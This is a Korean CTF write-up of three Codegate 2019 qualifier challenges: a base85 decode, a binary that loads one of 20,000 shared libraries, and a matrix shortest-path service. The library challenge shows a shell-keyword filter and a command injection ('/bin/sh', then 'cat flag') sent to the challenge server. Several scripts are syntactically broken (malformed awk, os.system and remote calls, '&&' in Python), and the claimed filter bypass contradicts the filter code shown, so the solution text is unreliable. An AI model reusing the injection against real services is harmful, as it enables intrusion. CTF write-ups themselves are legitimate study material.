#Codegate2019 예선 writeup
##### 대회 기간 : 2019.01.26 ~ 당일

---

##### Problem - MIC check
Let the hacking begins ~

Decode it : 9P&;gFD,5.BOPCdBl7Q+@V’1dDK?qL

##### solve
base 85로 인코딩 된 문자열입니다.
Online decode tool 을 이용해서 해독이 가능합니다.

flag : `Let the hacking begins ~`

---
---
##### Problem - 20000
nc 110.10.147.106 15959

download

##### solve
libc 파일이 20000개나 있습니다...ㅠ
파일을 다운로드 받아 바이너리 파일을 ida로 열어봅니다.

```c
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rax@6
  signed __int64 result; // rax@6
  void *v5; // rdi@7
  char *v6; // rax@8
  __int64 v7; // rbx@10
  unsigned int v8; // [sp+Ch] [bp-94h]@1
  void (__fastcall *v9)(void *, const char *); // [sp+10h] [bp-90h]@7
  void *handle; // [sp+18h] [bp-88h]@5
  char s; // [sp+20h] [bp-80h]@1
  int v12; // [sp+80h] [bp-20h]@1
  int v13; // [sp+84h] [bp-1Ch]@1
  __int64 v14; // [sp+88h] [bp-18h]@1

  v14 = *MK_FP(__FS__, 40LL);
  sub_400A06(a1, a2, a3);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(&s, 0, 0x60uLL);
  v12 = 0;
  printf("INPUT : ", 0LL, &v13);
  __isoc99_scanf("%d", &v8);
  if ( (signed int)v8 <= 0 && (signed int)v8 > 20000 )
  {
    printf("Invalid Input");
    exit(-1);
  }
  sprintf(&s, "./20000_so/lib_%d.so", v8);
  handle = dlopen(&s, 1);
  if ( handle )
  {
    v5 = handle;
    v9 = (void (__fastcall *)(void *, const char *))dlsym(handle, "test");
    if ( v9 )
    {
      v9(v5, "test");
      dlclose(handle);
      result = 0LL;
    }
    else
    {
      v6 = dlerror();
      fprintf(stderr, "Error: %s\n", v6);
      dlclose(handle);
      result = 1LL;
    }
  }
  else
  {
    v3 = dlerror();
    fprintf(stderr, "Error: %s\n", v3);
    result = 1LL;
  }
  v7 = *MK_FP(__FS__, 40LL) ^ v14;
  return result;
}
```
정수를 입력받아 해당하는 번호의 libc를 열어주는 바이너리입니다.

libc 1번을 열어봅시다.

```c
__int64 test()
{
  __int64 result; // rax@1
  __int64 v1; // rsi@1
  char buf; // [sp+0h] [bp-40h]@1
  __int16 v3; // [sp+30h] [bp-10h]@1
  __int64 v4; // [sp+38h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x30uLL);
  v3 = 0;
  puts("This is lib_1 file.");
  puts("How do you find vulnerable file?");
  read(0, &buf, 50uLL);
  system("exit");
  result = 0LL;
  v1 = *MK_FP(__FS__, 40LL) ^ v4;
  return result;
}
```
libc에 있는 test 함수가 이 libc의 main입니다.

문자열을 출력하고 어떻게 찾았냐는 말과 함께 문자열을 입력받습니다.
하지만 그리고 `system(exit)`을 통해 종료됩니다.

이제 이 문자열들이 어떤 조건, 제약을 받는지 filter함수를 분석해봅시다.

```c
char *__fastcall filter2(const char *a1)
{
  char *result; // rax@21

  if ( strchr(a1, 'v') )
    exit(0);
  if ( strchr(a1, 'm') )
    exit(0);
  if ( strchr(a1, 'p') )
    exit(0);
  if ( strchr(a1, 'd') )
    exit(0);
  if ( strchr(a1, 'n') )
    exit(0);
  if ( strstr(a1, "bin") )
    exit(0);
  if ( strstr(a1, "sh") )
    exit(0);
  if ( strstr(a1, "bash") )
    exit(0);
  if ( strchr(a1, 'f') )
    exit(0);
  if ( strchr(a1, 'l') )
    exit(0);
  result = strchr(a1, 'g');
  if ( result )
    exit(0);
  return result;
}
```

다음과 같이 필터링을 합니다. bin,sh,bash 문자열과 flag 필터링을 위해.. f,l,g 세 개의 문자를 필터링합니다. 그 외의 문자들은... 음... md5나 base64를 통한 커맨드 인젝션을 방지하기 위함이 아닐까 라는 개인적인 생각입니다..

libc2와 3또한 비슷하게 필터링이 걸려있었습니다.
여기서 취약한 libc를 찾아 실행시키는 것이 이 문제를 푸는 방법인것 같습니다.

문제 해결을 위해 아래의 세 가지를 생각해봤습니다.
* 1. libc의 공통점으로 system() 함수가 실행된다.
* 2. filter 함수에서 필터링 되는 부분이 일부 누락된다면?
* 3. system(buf-사용자입력값) 이 반드시 있을 것이다.
* 4. 아니라면 bof 인데.... 우선 첫번째 경우를 생각해보자.

이제 저 20000개의 libc 중 취약한 라이브러리를 어떻게 찾을 수 있을까?

우선 libc가 모두 똑같은 패턴을 갖고 있는지 부터 확인합니다.

```c
if ( handle )
{
  v3 = (void (__fastcall *)(char *, char *))dlsym(handle, "filter1");
  v6 = dlopen(""./20000_so/lib_3299.so", 1);
  if(v6)
  {
    v4 = (void (__fastcall *)(char *))dlsym(v6, "filter2");
    puts("This is lib_3299 file.");
    puts("How do you find vulnerable for file?");
    read(0, &buf, 0x32uLL);
    v3(&buf, &buf);
    v4(&buf);
    sprintf(%s, "ls \"%s\"", &buf);
    system(&s);
    dlclose(handle);
    dlclose(v6);
    ...
  }
}
```

so 파일은 처음 libc1 과 위의 코드 두가지 패턴으로 나뉘는데

"exit" 명령과 "ls" 명령어가 들어있는 so 파일을 grep 명령을 통해 추출해봅시다.

`grep -rnw "ls" | awk 'print{$3}' > aaa.txt`
`grep -rnw "exit" | awk 'print{$3}' > bbb.txt`

이렇게 추출된 아이들을 지워줍시다.

```python
import os

f = open("aaa.txt")
g = open("bbb.txt")

data1 = f.readline()
data2 = f.readline()

for i in data1:
  try:
    os.system("rm -rf %") i
  except:
    continue

for i in data2:
  try:
    os.system("rm -rf $%") i
  except:
    continue
```

흠 제가 돌렸을 때 약 7개 정도가 남았는데... 이정도야 뭐.... 분석합시다.

```c
if ( v7 )
{
  v5 = (void (__fastcall *)(char *))dlsym(v7, "filter2");
  puts("This is lib_17394 file.");
  puts("How do you find vulnerable file?");
  read(0, &buf, 0x32uLL);
  v4(&buf, &buf);
  v5(&buf);
  sprintf(&s, "%s 2 > /dev/null", &buf, v4);
  system(&s);
  dlclose(handle);
  dlclose(v7);
  result = 0LL;
}
```
lib_17394 입니다.
다른파일들과는 다르게 system() 함수에 사용자 입력값을 넣어줍니다.

```
INPUT : 17394
This is lib_17394 file.
How do you find vulnerable file?
/bin/sh
cat flag
flag{Are_y0u_A_h@cker_in_real-world?}
```
flag : `flag{Are_y0u_A_h@cker_in_real-world?}`

---

##### Problem - algo_auth

I like an algorithm
nc 110.10.147.104 15712

##### solve

```==> Hi, I like an algorithm. So, i make a new authentication system.
==> It has a total of 100 stages.
==> Each stage gives a 7 by 7 matrix below sample.
==> Find the smallest path sum in matrix,
    by starting in any cell in the left column and finishing in any cell in the right column,
    and only moving up, down, and right.
==> The answer for the sample matrix is 12.
==> If you clear the entire stage, you will be able to authenticate.

[sample]
99 99 99 99 99 99 99
99 99 99 99 99 99 99
99 99 99 99 99 99 99
99 99 99 99 99 99 99
99  1  1  1 99  1  1
 1  1 99  1 99  1 99
99 99 99  1  1  1 99

If you want to start, type the G key within 10 seconds....>>

```
최단경로 찾기 문제입니다. 문제가 100문제 이지만 10초를 주기 때문에 가독성, 공간복잡도를 생각하지 않아도 될것같습니다 ㅎ 가중치가 양수인 Dijkstra 알고리즘의 일부 변형하여 사용하면 될 것 같습니다.

```python
from pwn import*
import queue

def shallow_ret(bak_m, x, y):
  return 0 <= x < len(bak_m) and 0 <= y < len(bak_m(x))

def n_line(bak_m, x, y):
  for i in [-1, 0, 1]:
    for j in [0, 1]:
      if abs(i) + abs(j) == 1 && shallow_ret(bak_m, x + i, y + j):
        yield(x + i, y + j)

def dijstra_algo(bak_m):
  que = queue.PriorityQueue()
  ssp = dict()
  ssp['ans'] = 10**128

  for i in range(0, 8):
    for j in range(0, 7):
      ssp[(i),(j)] = 10**128
    que.put((x[i][0],[x[i][0]],(i, 0)))
    ssp[(i, 0)] = x[i][0]

  while not que.empty():
    top, p, coor = que.get(que)
    x, y = coor

    if y == len(bak_m[x]) - 1:
      if top < ssp['ans']:
        print p

      ssp['ans'] = min(ssp['ans'], top)

    for x_i, y_i in n_line(bak_m, x, y):
      if top + m[x_i][y_i] < ssp[(x_i, y_i)]:
        ssp[(x_i, y_i)] = top + bak_m[x_i][y_i]
        que.put((top + m[x_i][y_i], p + [bak_m[x_i][y_i]], (x_i, y_i)))

  return ssp['ans']

def solver(p):
  arr = []
  p.recvuntil("***")
  p.recv(1024)

  arr.append(list(map(int, p.recvline().split())))
  low = dijstra_algo(arr)
  r.sendline(str(low))

def main():
  p = remote(110.10.147.104, 15712)
  p.recvuntil('seconds...>>')
  p.sendline('G')

  for i in ragne(0, 100):
    solver(p)

  p.recv(1024)
  p.interactive()

```

입력해보니 1~100 번까지 답에 해당하는 숫자를
ASCII code로 바꿔 Base64로 Decode 하라네요

```python
arry = [82, 107, 120, 66, 82, 121, 65, 54, 73, 71,
        99, 119, 77, 71, 57, 118, 84, 48, 57, 107,
        88, 50, 111, 119, 81, 105, 69, 104, 73, 86,
        57, 102, 88, 51, 86, 117, 89, 50, 57, 116,
        90, 109, 57, 121, 100, 68, 82, 105, 98, 71,
        86, 102, 88, 51, 77, 122, 89, 51, 86, 121,
        97, 88, 82, 53, 88, 49, 57, 112, 99, 49, 57,
        102, 98, 106, 66, 48, 88, 49, 56, 48, 88, 49,
        57, 122, 90, 87, 78, 49, 99, 109, 108, 48, 101,
        83, 69, 104, 73, 83, 69, 104]
arry = map(chr, arry)
print ''.join(arry).decode('base64')
```
```
secretpack@ubuntu:~$ python dec.py
FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!
```

flag ```g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!```

---

### 후기

혹한기훈련주기라 많이 보지는 못했지만
그래도 풀 수 있는 문제가 3문제나 있어서 기분 좋았습니다.

대회 운영에 있어서 비판이 정말 많았지만
군인이여서 그런가 밖에서 하는 모든 활동들은 재밋네요 ㅎㅎ

다음 번엔 훨씬 나아진 대회 운영 방식과
재미있는 문제로 찾아 왔으면 합니다 ㅎ

아쉽기도 하고 재밌기도 했던 대회였던것 같습니다.

---
